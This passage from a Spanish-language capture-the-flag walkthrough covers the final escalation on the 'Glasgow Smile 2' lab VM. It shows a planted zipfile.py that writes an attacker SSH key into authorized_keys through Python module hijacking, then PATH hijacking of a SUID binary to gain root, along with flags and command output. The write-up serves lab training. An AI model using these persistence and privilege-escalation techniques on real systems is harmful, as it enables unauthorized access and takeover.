+:!:  !!:  !!:       !!:  !!!  !!:  !!!  !!:     !!:  
+ ::!!:!   :!:       :!:  !:!  :!:  !:!  :!:     :!:  
+  ::::     :: ::::   ::   ::  ::::: ::  :::     ::   
+   :      : :: ::   ::    :    : :  :    :      :    
+                                                     
+</span><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">/opt/get_out</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos crear un zipfile.py y darle permisos de ejecución esperando que use el de la carpeta actual, usando la libreria os para meter nuestra clave publica como autorizada</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">/opt/get_out</span><span class="p">$ cat zipfile.py
+import os
+os.system("mkdir ~/.ssh; echo 'ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBABX56XvK7GdgV/s4itOau2RwJz5IhcHYrHnsjLsLq2qdG31rvldMCD4EwtLZsFW7kY59QmbNvUx0bBLepeOeDw/YQDfHlZuTdApfndut68XAbsNMIn5jjD6s7ssZxTHbqk1LQg5M9OU6IgCZbnm8ObVfRdFVHXJCRkoC5jonIQzJo7klw== ECDSA 521 bit Keys' > ~/.ssh/authorized_keys")
+</span><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">/opt/get_out</span><span class="p">$ chmod +x zipfile.py
+</span><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">/opt/get_out</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Pasados unos segundos podremos conectarnos por ssh con nuestra id_rsa y conseguir otra flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> venom@192.168.100.13 -i id_rsa
+</span><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1002(venom) gid=1002(venom) groups=1002(venom)
+</span><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+192.168.100.13 172.17.0.1 172.18.0.1 
+</span><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user4.txt 
+GS2{b79aba0d627bcd2025e35c2a192e1d51}
+</span><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Encontramos un directorio que contiene varios archivos de root con permisos suid</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls
+</span><span class="na">Ladies_and_Gentlmen</span><span class="p">  user4.txt
+</span><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ cd Ladies_and_Gentlmen
+</span><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~/Ladies_and_Gentlmen</span><span class="p">$ ls
+</span><span class="na">Gotham
+</span><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~/Ladies_and_Gentlmen</span><span class="p">$ cd Gotham
+</span><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~/Ladies_and_Gentlmen/Gotham</span><span class="p">$ ls -l
+total 264
+-rwsr-xr-x 1 root root   988 Jun 23  2020 </span><span class="kd">batman</span><span class="p">
+-rwsr-xr-x 1 root root 16659 Dec 18  2020 </span><span class="kd">gothamwillburn1</span><span class="p">
+-rwsr-xr-x 1 root root 16744 Dec 18  2020 </span><span class="kd">gothamwillburn10</span><span class="p">
+-rwsr-xr-x 1 root root 16749 Dec 18  2020 </span><span class="kd">gothamwillburn11</span><span class="p">
+-rwsr-xr-x 1 root root 16752 Dec 18  2020 </span><span class="kd">gothamwillburn12</span><span class="p">
+-rwsr-xr-x 1 root root 16755 Dec 18  2020 </span><span class="kd">gothamwillburn13</span><span class="p">
+-rwsr-xr-x 1 root root 16660 Dec 18  2020 </span><span class="kd">gothamwillburn2</span><span class="p">
+-rwsr-xr-x 1 root root 16672 Dec 18  2020 </span><span class="kd">gothamwillburn3</span><span class="p">
+-rwsr-xr-x 1 root root 16720 Dec 18  2020 </span><span class="kd">gothamwillburn4</span><span class="p">
+-rwsr-xr-x 1 root root 16675 Dec 18  2020 </span><span class="kd">gothamwillburn5</span><span class="p">
+-rwsr-xr-x 1 root root 16699 Dec 18  2020 </span><span class="kd">gothamwillburn6</span><span class="p">
+-rwsr-xr-x 1 root root 16708 Dec 18  2020 </span><span class="kd">gothamwillburn7</span><span class="p">
+-rwsr-xr-x 1 root root 16723 Dec 18  2020 </span><span class="kd">gothamwillburn8</span><span class="p">
+-rwsr-xr-x 1 root root 16735 Dec 18  2020 </span><span class="kd">gothamwillburn9</span><span class="p">
+</span><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~/Ladies_and_Gentlmen/Gotham</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Entre ellos gothamwillburn4 que podemos ver que usa cat sin la ruta absoluta</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~/Ladies_and_Gentlmen/Gotham</span><span class="p">$ strings gothamwillburn4
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+system
+GLIBC_2.2.5
+u/UH
+[]A\A]A^A_
+</span><span class="kd">cat ./batman</span><span class="p">
+;*3$"
+GCC: (Debian 8.3.0-6) 8.3.0
+crtstuff.c
+deregister_tm_clones
+completed.7325
+frame_dummy
+gothamwillburn.c
+system@@GLIBC_2.2.5
+main
+</span><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~/Ladies_and_Gentlmen/Gotham</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos secuestrar el path para que tome nuestro cat y asi convertirnos en root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~/Ladies_and_Gentlmen/Gotham</span><span class="p">$ echo "su" > cat
+</span><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~/Ladies_and_Gentlmen/Gotham</span><span class="p">$ chmod +x cat
+</span><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~/Ladies_and_Gentlmen/Gotham</span><span class="p">$ export PATH=$PWD:$PATH
+</span><span class="s2">venom@glasgowsmile2</span><span class="p">:</span><span class="na">~/Ladies_and_Gentlmen/Gotham</span><span class="p">$ ./gothamwillburn4
+</span><span class="s2">root@glasgowsmile2</span><span class="p">:</span><span class="na">/home/venom/Ladies_and_Gentlmen/Gotham</span><span class="p"># cd
+</span><span class="s2">root@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+192.168.100.13 172.17.0.1 172.18.0.1 
+</span><span class="s2">root@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p"># cat root.txt
+      ....        .         ..                .x+=:.                                                     ...                                .          ..                           
+   .x88" `^x~  xH(`   x .d88"                z`    ^%                            x=~                 .x888888hx    :                       @88>  x .d88"               .--~*teu.    
+  X888   x8 ` 8888h    5888R                    .   <k                    u.    88x.   .e.   .e.    d88888888888hxx     ..    .     :      %8P    5888R               dF     988Nx  
+ 88888  888.  %8888    '888R         u        .@8Ned8"      uL      ...ue888b  '8888X.x888:.x888   8" ... `"*8888%`   .888: x888  x888.     .     '888R        .u    d888b   `8888> 
+<8888X X8888   X8?      888R      us888u.   .@^%8888"   .ue888Nc..  888R Y888r  `8888  888X '888k !  "   ` .xnxx.    ~`8888~'888X`?888f`  .@88u    888R     ud8888.  ?8888>  98888F 
+X8888> 488888>"8888x    888R   .@88 "8888" x88:  `)8b. d88E`"888E`  888R I888>   X888  888X  888X X X   .H8888888%:    X888  888X '888>  ''888E`   888R   :888'8888.  "**"  x88888~ 
+X8888>  888888 '8888L   888R   9888  9888  8888N=*8888 888E  888E   888R I888>   X888  888X  888X X 'hn8888888*"   >   X888  888X '888>    888E    888R   d888 '88%"       d8888*`  
+?8888X   ?8888>'8888X   888R   9888  9888   %8"    R88 888E  888E   888R I888>   X888  888X  888X X: `*88888%`     !   X888  888X '888>    888E    888R   8888.+"        z8**"`   : 
+ 8888X h  8888 '8888~   888R   9888  9888    @8Wou 9%  888E  888E  u8888cJ888   .X888  888X. 888~ '8h.. ``     ..x8>   X888  888X '888>    888E    888R   8888L        :?.....  ..F 
+  ?888  -:8*"  <888"   .888B . 9888  9888  .888888P`   888& .888E   "*888*P"    `%88%``"*888Y"     `88888888888888f   "*88%""*88" '888!`   888&   .888B . '8888c. .+  <""888888888~ 
+   `*88.      :88%     ^*888%  "888*""888" `   ^"F     *888" 888&     'Y"         `~     `"         '%8888888888*"      `~    "    `"`     R888"  ^*888%   "88888%    8:  "888888*  
+      ^"~====""`         "%     ^Y"   ^Y'               `"   "888E                                     ^"****""`                            ""      "%       "YP'     ""    "**"`   
+                                                       .dWi   `88E                                                                                                                  
+                                                       4888~  J8%                                                                                                                   
+                                                        ^"===*"`                                                                                                                   
+
+What do you get when you cross a mentally-ill loner with a society that abandons him and treats him like trash!? 
+I'll tell you what you get:
+YOU GET WHAT YOU FUCKING DESERVE!
+Congratulations you pwned GS2!
+
+GS2{df135baa6a216b6fe05f57a1efc1c90f}
+
+If you liked my Virtual Machines, offer me a coffee, I'll work on the next one!
+https://www.buymeacoffee.com/mindsflee
+mindsflee
+
+</span><span class="s2">root@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+    </div>
+  </body>
+</html>
